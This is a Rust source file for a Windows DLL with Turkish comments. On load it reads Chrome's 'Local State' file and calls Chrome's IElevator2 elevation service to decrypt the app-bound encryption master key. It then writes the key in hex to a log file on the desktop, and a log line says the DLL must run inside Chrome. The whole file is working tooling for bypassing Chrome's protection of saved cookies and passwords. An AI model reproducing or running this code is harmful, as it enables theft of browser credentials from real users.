use std::fs;
use std::io::Write;
use std::path::PathBuf;
use std::ptr;
use std::thread;
use std::time::{SystemTime, UNIX_EPOCH};

use serde_json::Value;
use winapi::{
    shared::{
        guiddef::GUID,
        minwindef::UINT,
        wtypes::BSTR,
        wtypesbase::CLSCTX_LOCAL_SERVER,
    },
    um::{
        combaseapi::{CoCreateInstance, CoInitializeEx},
        objbase::COINIT_APARTMENTTHREADED,
        oleauto::{SysAllocStringByteLen, SysFreeString, SysStringLen, SysStringByteLen},
        winnt::DLL_PROCESS_ATTACH,
    },
    ctypes::c_void,
};

// Chrome 144+ için CLSID (aynı kalıyor)
const CLSID_ELEVATOR: GUID = GUID {
    Data1: 0x708860E0,
    Data2: 0xF641,
    Data3: 0x4611,
    Data4: [0x88, 0x95, 0x7D, 0x86, 0x7D, 0xD3, 0x67, 0x5B],
};

// YENİ: Chrome 144+ için IElevator2 IID'si
// Kaynak: xaitax/Chrome-App-Bound-Encryption-Decryption v0.18.0 [citation:2]
const IID_IELEVATOR2: GUID = GUID {
    Data1: 0x1BF5208B,
    Data2: 0x295F,
    Data3: 0x4992,
    Data4: [0xB5, 0xF4, 0x3A, 0x9B, 0xB6, 0x49, 0x48, 0x38],
};

// IElevator2 vtable (DecryptData offset 40, Chrome için)
#[repr(C)]
struct IElevatorVTbl {
    QueryInterface: unsafe extern "system" fn(*mut c_void, *const GUID, *mut *mut c_void) -> i32,
    AddRef: unsafe extern "system" fn(*mut c_void) -> u32,
    Release: unsafe extern "system" fn(*mut c_void) -> u32,
    RunRecoveryCRXElevated: unsafe extern "system" fn(*mut c_void, *const u16, *const u16, *const u16, u32, *mut u32) -> i32,
    EncryptData: unsafe extern "system" fn(*mut c_void, u32, BSTR, *mut BSTR, *mut u32) -> i32,
    DecryptData: unsafe extern "system" fn(*mut c_void, u32, BSTR, *mut BSTR, *mut u32) -> i32,
}

fn log_message(msg: &str) -> Result<(), std::io::Error> {
    let desktop = std::env::var("USERPROFILE")
        .map(|p| PathBuf::from(p).join("Desktop").join("log.txt"))
        .map_err(|e| std::io::Error::new(std::io::ErrorKind::Other, e))?;

    let timestamp = SystemTime::now()
        .duration_since(UNIX_EPOCH)
        .unwrap_or_default()
        .as_secs();

    let mut file = fs::OpenOptions::new()
        .create(true)
        .append(true)
        .open(desktop)?;

    writeln!(file, "[{}] {}", timestamp, msg)?;
    Ok(())
}

fn decrypt_with_elevator(encrypted_blob: &[u8]) -> Result<Vec<u8>, String> {
    let _ = log_message(&format!("IElevator2 ile çözme başlatılıyor, veri uzunluğu: {}", encrypted_blob.len()));

    unsafe {
        let hr = CoInitializeEx(ptr::null_mut(), COINIT_APARTMENTTHREADED);
        if hr < 0 {
            return Err(format!("CoInitializeEx başarısız: 0x{:08X}", hr as u32));
        }

        let mut elevator_ptr: *mut c_void = ptr::null_mut();
        let hr = CoCreateInstance(
            &CLSID_ELEVATOR,
            ptr::null_mut(),
            CLSCTX_LOCAL_SERVER,
            &IID_IELEVATOR2,  // YENİ IID
            &mut elevator_ptr,
        );

        if hr < 0 {
            let error_code = hr as u32;
            let _ = log_message(&format!("CoCreateInstance başarısız: 0x{:08X}", error_code));

            // Hata kodunu anlamlı mesaja çevir
            let error_msg = match error_code {
                0x80040154 => "CLSID not registered (0x80040154) - Elevation service bulunamadı",
                0x80029C4A => "Type library error (0x80029C4A) - IID uyumsuzluğu",
                _ => "Bilinmeyen hata"
            };
            return Err(format!("CoCreateInstance başarısız: 0x{:08X} - {}", error_code, error_msg));
        }

        let _ = log_message("IElevator2 instance'ı oluşturuldu.");

        let bstr_encrypted = SysAllocStringByteLen(encrypted_blob.as_ptr() as *const i8, encrypted_blob.len() as UINT);
        if bstr_encrypted.is_null() {
            return Err("SysAllocStringByteLen başarısız".to_string());
        }

        let mut bstr_decrypted: BSTR = ptr::null_mut();
        let mut last_error: u32 = 0;

        let vtable = *(elevator_ptr as *const *const IElevatorVTbl);
        let hr = ((*vtable).DecryptData)(elevator_ptr, 1, bstr_encrypted, &mut bstr_decrypted, &mut last_error);

        SysFreeString(bstr_encrypted);

        if hr < 0 {
            return Err(format!("DecryptData başarısız: 0x{:08X}, last_error: {}", hr as u32, last_error));
        }

        let byte_len = SysStringByteLen(bstr_decrypted) as usize;
        let raw_bytes = std::slice::from_raw_parts(bstr_decrypted as *const u8, byte_len);
        let decrypted = raw_bytes.to_vec();

        SysFreeString(bstr_decrypted);
        ((*vtable).Release)(elevator_ptr);

        let _ = log_message(&format!("IElevator2 çözme başarılı, çıktı uzunluğu: {} byte", decrypted.len()));
        Ok(decrypted)
    }
}

fn do_work() -> Result<(), Box<dyn std::error::Error>> {
    log_message("DLL yüklendi, işlem başlatılıyor...")?;

    let local_state_path = r"C:\Users\Kemal\AppData\Local\Google\Chrome\User Data\Local State";
    let content = fs::read_to_string(local_state_path)
        .map_err(|e| format!("Dosya okunamadı: {}", e))?;
    log_message("Local State dosyası okundu.")?;

    let json: Value = serde_json::from_str(&content)
        .map_err(|e| format!("JSON ayrıştırılamadı: {}", e))?;

    let key_b64 = if let Some(val) = json.get("app_bound_encrypted_key") {
        val.as_str()
    } else if let Some(os_crypt) = json.get("os_crypt") {
        os_crypt.get("app_bound_encrypted_key").and_then(|v| v.as_str())
    } else {
        None
    };

    let key_b64 = key_b64
        .ok_or("Anahtar bulunamadı: 'app_bound_encrypted_key'")?;
    log_message(&format!("Base64 anahtar bulundu, uzunluk: {}", key_b64.len()))?;

    use base64::engine::Engine as _;
    let decoded = base64::engine::general_purpose::STANDARD.decode(key_b64)
        .map_err(|e| format!("Base64 çözümleme hatası: {}", e))?;
    log_message(&format!("Base64 çözüldü, ham veri uzunluğu: {} byte", decoded.len()))?;

    let dpapi_blob = if decoded.len() >= 4 && &decoded[0..4] == b"APPB" {
        log_message("APPB header'ı tespit edildi, korunuyor...")?;
        &decoded[..]
    } else {
        log_message("APPB header'ı bulunamadı, tüm veri kullanılıyor...")?;
        &decoded
    };

    log_message(&format!("DPAPI blob uzunluğu: {} byte", dpapi_blob.len()))?;

    match decrypt_with_elevator(dpapi_blob) {
        Ok(master_key) => {
            let hex_repr = master_key.iter().map(|b| format!("{:02x}", b)).collect::<String>();
            log_message(&format!("MASTER KEY (hex): {}", hex_repr))?;
            log_message(&format!("MASTER KEY uzunluğu: {} byte", master_key.len()))?;

            let ascii_part: String = master_key.iter()
                .filter(|&&b| b.is_ascii_graphic() || b == b' ')
                .map(|&b| b as char)
                .collect();
            if !ascii_part.is_empty() && ascii_part.len() < master_key.len() {
                log_message(&format!("MASTER KEY (ascii): {}", ascii_part))?;
            }
        }
        Err(e) => {
            log_message(&format!("IElevator2 çözme HATASI: {}", e))?;
            log_message("Not: Bu DLL Chrome içinde çalıştırılmalıdır.")?;
        }
    }

    log_message("İşlem tamamlandı.")?;
    Ok(())
}

#[no_mangle]
pub extern "system" fn DllMain(
    _hinst: *mut std::ffi::c_void,
    fdw_reason: u32,
    _lpv_reserved: *mut std::ffi::c_void,
) -> i32 {
    if fdw_reason == DLL_PROCESS_ATTACH {
        thread::spawn(|| {
            if let Err(e) = do_work() {
                let _ = log_message(&format!("HATA: {}", e));
            }
        });
    }
    1
}